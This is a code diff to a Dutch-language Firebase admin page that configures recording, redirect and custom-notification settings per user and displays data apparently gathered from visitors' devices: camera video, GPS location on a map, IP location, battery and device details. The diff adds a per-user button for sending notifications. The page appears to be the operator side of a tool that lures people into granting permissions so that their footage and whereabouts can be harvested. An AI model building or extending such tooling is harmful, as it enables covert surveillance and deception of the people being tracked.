@@ -95,7 +95,7 @@
             box-sizing: border-box;
             font-size: 1rem;
         }
-        .save-button, #trigger-redirect {
+        .save-button, #trigger-redirect, .send-user-notification-button {
             background-color: #007bff;
             color: white;
             padding: 14px 24px;
@@ -109,7 +109,7 @@
             text-decoration: none;
             text-align: center;
         }
-        .save-button:hover, #trigger-redirect:hover {
+        .save-button:hover, #trigger-redirect:hover, .send-user-notification-button:hover {
             background-color: #0056b3;
         }
         .data-section {
@@ -276,6 +276,8 @@
                     <tr>
                         <th>Titel</th>
                         <th>Waarde</th>
+                        <th>Notificatie Status</th> <!-- New Column -->
+                        <th>Actie</th> <!-- New Column -->
                     </tr>
                 </thead>
                 <tbody id="data-list">
@@ -303,6 +305,8 @@ const app = firebase.initializeApp(firebaseConfig);
 const db = firebase.firestore();
 const storage = firebase.storage(); // Initialize Firebase Storage
 
+const errorMessage = document.getElementById("error-message");
+const successMessage = document.getElementById('success-message');
 
 // --- Form Elements ---
 const micCamPermissionToggle = document.getElementById('mic-cam-permission');
@@ -315,15 +319,13 @@ const redirectSeconds = document.getElementById('redirect-seconds');
 const recordSeconds = document.getElementById('record-seconds');
 const notificationTitle = document.getElementById('notification-title');
 const notificationBody = document.getElementById('notification-body');
-const notificationIconFile = document.getElementById('notification-icon-file'); // File input
-const notificationIconUrlInput = document.getElementById('notification-icon-url'); // Hidden URL input
+const notificationIconFile = document.getElementById('notification-icon-file');
+const notificationIconUrlInput = document.getElementById('notification-icon-url');
 const saveSettingsButton = document.getElementById('save-settings');
 const triggerRedirectButton = document.getElementById('trigger-redirect');
-const successMessage = document.getElementById('success-message');
 const notificationExplanation = document.getElementById("notification-explanation");
 const locationExplanation = document.getElementById("location-explanation");
-const errorMessage = document.getElementById("error-message");
-const dataTableTitleElement = document.getElementById("data-table-title"); // Get title element
+const dataTableTitleElement = document.getElementById("data-table-title");
 
 let currentUserId = "user1"; // Initialize currentUserId globally
 
@@ -336,46 +338,57 @@ async function getNextUserId() {
         // Use a transaction to increment the counter safely
         const nextId = await db.runTransaction(async (transaction) => {
             const counterDoc = await transaction.get(counterRef);
-            let newCounter = 1; // Default to 1 if no counter exists
+            let newCounter = 1;
 
             if (counterDoc.exists) {
                 newCounter = counterDoc.data().count + 1;
+            } else {
+                newCounter = 1;
             }
 
-            transaction.set(counterRef, { count: newCounter }, { merge: true }); // Use set with merge
+            transaction.set(counterRef, { count: newCounter }, { merge: true });
             return newCounter;
         });
 
-        return `user${nextId}`; // Return "user1", "user2", etc.
+        return `user${nextId}`;
 
     } catch (error) {
         console.error("Error getting next user ID:", error);
         errorMessage.textContent = `Firestore Fout: ${error.message}`;
         errorMessage.style.display = 'block';
-
-        throw error; // Re-throw the error so it can be caught by the caller
+        throw error;
     }
 }
 
 
 // Add an item to the data table
-function addDataItem(title, value, isVideo = false, isMap = false) { // Added isMap parameter
+function addDataItem(userId, title, value, isVideo = false, isMap = false, notificationStatus = 'N/A') {
     const row = document.createElement('tr');
     const titleCell = document.createElement('td');
     const valueCell = document.createElement('td');
+    const notificationCell = document.createElement('td'); // New cell for notification status
+    const actionCell = document.createElement('td'); // New cell for action button
+    const sendButton = document.createElement('button');
 
     titleCell.textContent = title;
     titleCell.classList.add('editable');
     titleCell.setAttribute('data-original-title', title);
 
     if (isVideo) {
-        valueCell.appendChild(value); // Value is a video element
-    } else if (isMap) { // Handle map container
-        valueCell.appendChild(value); // Value is the map container div
-    }
-    else {
+        valueCell.appendChild(value);
+    } else if (isMap) {
+        valueCell.appendChild(value);
+    } else {
         valueCell.textContent = value;
     }
+
+    notificationCell.textContent = notificationStatus; // Display notification status
+    sendButton.textContent = "Stuur Notificatie";
+    sendButton.className = 'send-user-notification-button'; // Apply class for styling
+    sendButton.addEventListener('click', () => sendNotificationForUser(userId)); // Attach event listener
+
+    actionCell.appendChild(sendButton); // Append button to action cell
+
 
     titleCell.addEventListener('click', function() {
         const originalTitle = this.getAttribute('data-original-title');
@@ -383,12 +396,13 @@ function addDataItem(title, value, isVideo = false, isMap = false) { // Added is
         if (newTitle !== null && newTitle.trim() !== "") {
             this.textContent = newTitle.trim();
             this.setAttribute('data-original-title', newTitle.trim());
-            // No localStorage/Firebase updates for titles
         }
     });
 
     row.appendChild(titleCell);
     row.appendChild(valueCell);
+    row.appendChild(notificationCell); // Append notification cell
+    row.appendChild(actionCell); // Append action cell
     dataList.appendChild(row);
 }
 
@@ -414,13 +428,13 @@ function addDataItem(title, value, isVideo = false, isMap = false) { // Added is
         });
 
     }
+
 // Load settings AND data from Firestore
 async function loadSettingsAndData(userId) {
     const settingsRef = db.collection('userSettings').doc(userId);
     const dataRef = db.collection('userData').doc(userId);
 
     try {
-        // Load settings
         const settingsSnap = await settingsRef.get();
         if (settingsSnap.exists) {
             const settingsData = settingsSnap.data();
@@ -433,13 +447,14 @@ async function loadSettingsAndData(userId) {
             recordSeconds.value = settingsData.recordSeconds || '0';
             notificationTitle.value = settingsData.notificationTitle || '';
             notificationBody.value = settingsData.notificationBody || '';
-            notificationIconUrlInput.value = settingsData.notificationIcon || ''; // Laden URL in hidden input
+            notificationIconUrlInput.value = settingsData.notificationIcon || '';
         }
          updateExplanations();
 
-        // Load collected data
+        // Load collected data - ALWAYS load data for the given userId
         const dataSnap = await dataRef.get();
-        displayData(dataSnap.data() || {});
+        const userData = dataSnap.data() || {};
+        displayData(userId, userData); // Pass userId to displayData
 
     } catch (error) {
         console.error("Error loading settings/data:", error);
@@ -447,6 +462,7 @@ async function loadSettingsAndData(userId) {
         errorMessage.style.display = 'block';
     }
 }
+
  // Update explanations
       function updateExplanations(){
         if(locationPermissionToggle.checked){
@@ -468,9 +484,9 @@ async function saveSettings() {
     try {
         const nextUserId = await getNextUserId();
 
-        let uploadedIconUrl = notificationIconUrlInput.value; // Gebruik bestaande URL indien geen nieuwe upload
+        let uploadedIconUrl = notificationIconUrlInput.value;
 
-        if (notificationIconFile.files && notificationIconFile.files[0]) { // Check if a new file is selected
+        if (notificationIconFile.files && notificationIconFile.files[0]) {
             const file = notificationIconFile.files[0];
             const storageRef = storage.ref();
             const iconRef = storageRef.child(`notificationIcons/${nextUserId}_${Date.now()}_${file.name}`);
@@ -478,12 +494,12 @@ async function saveSettings() {
             try {
                 await iconRef.put(file);
                 uploadedIconUrl = await iconRef.getDownloadURL();
-                notificationIconUrlInput.value = uploadedIconUrl; // Update hidden input with new URL
+                notificationIconUrlInput.value = uploadedIconUrl;
             } catch (uploadError) {
                 console.error("Error uploading notification icon:", uploadError);
                 errorMessage.textContent = `Fout bij uploaden notificatie icoon: ${uploadError.message}`;
                 errorMessage.style.display = 'block';
-                return; // Stop saving settings if icon upload fails
+                return;
             }
         }
 
@@ -499,17 +515,17 @@ async function saveSettings() {
             recordSeconds: recordSeconds.value,
             notificationTitle: notificationTitle.value,
             notificationBody: notificationBody.value,
-            notificationIcon: uploadedIconUrl // Gebruik de geuploadde URL
+            notificationIcon: uploadedIconUrl
         };
-        updateExplanations();
+         updateExplanations();
 
         await settingsRef.set(settings);
         console.log("Settings saved successfully for user:", nextUserId);
         successMessage.style.display = 'block';
         setTimeout(() => { successMessage.style.display = 'none'; }, 3000);
 
-        currentUserId = nextUserId; // <-- **ADD THIS LINE: Update currentUserId**
-        loadSettingsAndData(currentUserId); // Now reload settings for the *new* current user
+        currentUserId = nextUserId;
+        loadSettingsAndData(currentUserId);
 
     } catch (error) {
         console.error("Error saving settings:", error);
@@ -520,39 +536,47 @@ async function saveSettings() {
 
 
 // Display data in the table (NOW WITH EXTRA CHECKS)
-async function displayData(data) {
-    dataList.innerHTML = ''; // Clear existing data
-    errorMessage.style.display = 'none'; // Hide previous errors
+async function displayData(userId, data) {
+    dataList.innerHTML = '';
+    errorMessage.style.display = 'none';
 
     console.log("Data received in displayData:", data);
+
+    let notificationStatus = "Niet Beschikbaar"; // Default status
+
+    if ("Notification" in window) {
+        notificationStatus = Notification.permission; // Get current permission
+    } else {
+        notificationStatus = "Niet Ondersteund";
+    }
+
 
     try {
         if (data.videoUrl) {
             const videoElement = document.createElement('video');
-            videoElement.src = data.videoUrl; // Use Firebase Storage URL directly
+            videoElement.src = data.videoUrl;
             videoElement.controls = true;
             videoElement.style.width = '100%';
-            addDataItem("Opname", videoElement, true);
+            addDataItem(userId, "Opname", videoElement, true, false, notificationStatus); // Pass userId and notificationStatus
         } else {
+            addDataItem(userId, "Opname", "Geen data", false, false, notificationStatus); // Pass userId and notificationStatus
             console.log("No videoUrl found in data.");
         }
 
         if (data.location) {
-            addDataItem("Latitude", data.location.latitude.toFixed(4));
-            addDataItem("Longitude", data.location.longitude.toFixed(4));
-             // TIP: Display accuracy if available
+            addDataItem(userId, "Latitude", data.location.latitude.toFixed(4), false, false, notificationStatus);
+            addDataItem(userId, "Longitude", data.location.longitude.toFixed(4), false, false, notificationStatus);
             if(data.location.accuracy){
-                addDataItem("Locatie Nauwkeurigheid", `±${data.location.accuracy.toFixed(0)} meter`);
+                addDataItem(userId, "Locatie Nauwkeurigheid", `±${data.location.accuracy.toFixed(0)} meter`, false, false, notificationStatus);
             }
 
-            // --- OpenStreetMap Integration ---
+
             if (data.location.latitude && data.location.longitude) {
                 const mapContainer = document.createElement('div');
-                mapContainer.id = 'location-map'; // Set ID for Leaflet to target
-                addDataItem("Locatie op Kaart", mapContainer, false, true); // Add map container to table, isMap=true
+                mapContainer.id = 'location-map';
+                addDataItem(userId, "Locatie op Kaart", mapContainer, false, true, notificationStatus);
 
-                // Initialize Leaflet map AFTER the map container is added to the DOM
-                const map = L.map('location-map').setView([data.location.latitude, data.location.longitude], 15); // Zoom level 15
+                const map = L.map('location-map').setView([data.location.latitude, data.location.longitude], 15);
 
                 L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                     attribution: '© <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
@@ -562,47 +586,55 @@ async function displayData(data) {
                     .bindPopup('<b>Huidige Locatie</b>').openPopup();
             }
         } else {
+            addDataItem(userId, "Locatie", "Geen data", false, false, notificationStatus);
             console.log("No location found in data.");
         }
 
-        // TIP: Display IP Location Data if available
         if (data.ipLocation) {
-            addDataItem("IP Adres", data.ipLocation.ip);
-            addDataItem("IP Stad", data.ipLocation.city);
-            addDataItem("IP Regio", data.ipLocation.region);
-            addDataItem("IP Land", data.ipLocation.country);
+            addDataItem(userId, "IP Adres", data.ipLocation.ip, false, false, notificationStatus);
+            addDataItem(userId, "IP Stad", data.ipLocation.city, false, false, notificationStatus);
+            addDataItem(userId, "IP Regio", data.ipLocation.region, false, false, notificationStatus);
+            addDataItem(userId, "IP Land", data.ipLocation.country, false, false, notificationStatus);
         } else {
+             addDataItem(userId, "IP Locatie", "Geen data", false, false, notificationStatus);
             console.log("No IP location found in data.");
         }
 
 
         if (data.batteryPercentage) {
-            addDataItem("Battery Percentage", `${data.batteryPercentage.toFixed(0)}%`);
+            addDataItem(userId, "Battery Percentage", `${data.batteryPercentage.toFixed(0)}%`, false, false, notificationStatus);
         } else{
+            addDataItem(userId, "Battery Percentage", "Geen data", false, false, notificationStatus);
             console.log("No batteryPercentage found in data")
         }
 
         if (data.locationError) {
-            addDataItem("Locatie Fout", data.locationError);
+            addDataItem(userId, "Locatie Fout", data.locationError, false, false, notificationStatus);
         } else{
+            addDataItem(userId, "Locatie Fout", "Geen data", false, false, notificationStatus);
             console.log("No location error found in data")
         }
 
         if (data.batteryError) {
-            addDataItem("Batterij Fout", data.batteryError);
+            addDataItem(userId, "Batterij Fout", data.batteryError, false, false, notificationStatus);
         }else{
+            addDataItem(userId, "Batterij Fout", "Geen data", false, false, notificationStatus);
             console.log("No Battery error found in data")
         }
         if (data.cameraError) {
-            addDataItem("Camera/Microfoon Fout", data.cameraError);
+            addDataItem(userId, "Camera/Microfoon Fout", data.cameraError, false, false, notificationStatus);
         }else{
+            addDataItem(userId, "Camera/Microfoon Fout", "Geen data", false, false, notificationStatus);
             console.log("No camera error found in data")
         }
         if (data.deviceInfo) {
-            addDataItem("Device Informatie", data.deviceInfo);
+            addDataItem(userId, "Device Informatie", data.deviceInfo, false, false, notificationStatus);
         } else {
+            addDataItem(userId, "Device Informatie", "Geen data", false, false, notificationStatus);
             console.log("No device info found in data");
         }
+
+
     } catch (error) {
         console.error("Error displaying data:", error);
         errorMessage.textContent = `Fout bij weergeven data: ${error.message}`;
@@ -611,57 +643,68 @@ async function displayData(data) {
 }
 
 
+// --- Function to send notification for a specific user ---
+async function sendNotificationForUser(targetUserId) {
+    if (Notification.permission !== 'granted') {
+        errorMessage.textContent = "Notificatie toestemming niet gegeven voor deze browser. Kan geen notificatie sturen.";
+        errorMessage.style.display = 'block';
+        return; // Stop if no permission
+    }
+
+    const userSettingsRef = db.collection('userSettings').doc(targetUserId);
+
+    try {
+        const settingsSnap = await userSettingsRef.get();
+        if (settingsSnap.exists) {
+            const userData = settingsSnap.data();
+            const title = userData.notificationTitle;
+            const body = userData.notificationBody;
+            const iconUrl = userData.notificationIcon;
+
+            if (!title || !body) {
+                errorMessage.textContent = "Notificatie titel en bericht zijn niet ingesteld voor deze gebruiker.";
+                errorMessage.style.display = 'block';
+                return; // Stop if title or body is missing
+            }
+
+            new Notification(title, {
+                body: body,
+                icon: iconUrl || undefined
+            });
+            successMessage.textContent = `Notificatie verstuurd voor gebruiker ${targetUserId}!`;
+            successMessage.style.display = 'block';
+            setTimeout(() => { successMessage.style.display = 'none'; }, 3000);
+
+
+        } else {
+            errorMessage.textContent = `Instellingen niet gevonden voor gebruiker ${targetUserId}.`;
+            errorMessage.style.display = 'block';
+        }
+
+    } catch (error) {
+        console.error("Error sending notification to user:", error);
+        errorMessage.textContent = `Fout bij versturen notificatie: ${error.message}`;
+        errorMessage.style.display = 'block';
+    }
+}
+
+
+
 // Event listeners
 saveSettingsButton.addEventListener('click', saveSettings);
-triggerRedirectButton.addEventListener('click', (event) => {
-    // No preventDefault needed.
-});
+triggerRedirectButton.addEventListener('click', (event) => {});
 dataTableTitleElement.addEventListener('click', function() {
     const originalTitle = this.getAttribute('data-original-title');
     const newTitle = prompt("Bewerk de tabel titel:", originalTitle);
     if (newTitle !== null && newTitle.trim() !== "") {
         this.textContent = newTitle.trim();
         this.setAttribute('data-original-title', newTitle.trim());
-        // No localStorage/Firebase updates for table title for now
     }
 });
 
 
-
-// --- Request notification permission on page load ---
-(async () => {
-    if (!("Notification" in window)) {
-        console.log("This browser does not support notifications.");
-        return;
-    }
-
-    if (Notification.permission === "default") {
-        const permissionResult = await Notification.requestPermission();
-        if (permissionResult === 'granted') {
-            console.log("Notification permission granted!");
-        } else if (permissionResult === 'denied') {
-            console.log("Notification permission denied.");
-            notificationExplanation.textContent = "Notificaties zijn geblokkeerd voor deze site. Sta notificaties toe in je browser instellingen om notificaties te ontvangen.";
-            notificationExplanation.classList.remove("hidden"); // Show explanation
-            notificationPermissionToggle.checked = false; // Uncheck toggle
-            notificationPermissionToggle.disabled = true; // Disable toggle
-        } else { // permissionResult === 'default' (dismissed or ignored)
-            console.log("Notification permission dismissed or ignored.");
-        }
-    } else if (Notification.permission === 'granted') {
-        console.log("Notification permission already granted.");
-    } else if (Notification.permission === 'denied') {
-        console.log("Notification permission already denied.");
-        notificationExplanation.textContent = "Notificaties zijn geblokkeerd voor deze site. Sta notificaties toe in je browser instellingen om notificaties te ontvangen.";
-        notificationExplanation.classList.remove("hidden"); // Show explanation
-        notificationPermissionToggle.checked = false; // Uncheck toggle
-        notificationPermissionToggle.disabled = true; // Disable toggle
-    }
-
-
-    loadSettingsAndData(currentUserId); // Initial load
-})();
-
+// Initial load
+loadSettingsAndData(currentUserId);
 
     </script>
 </body>
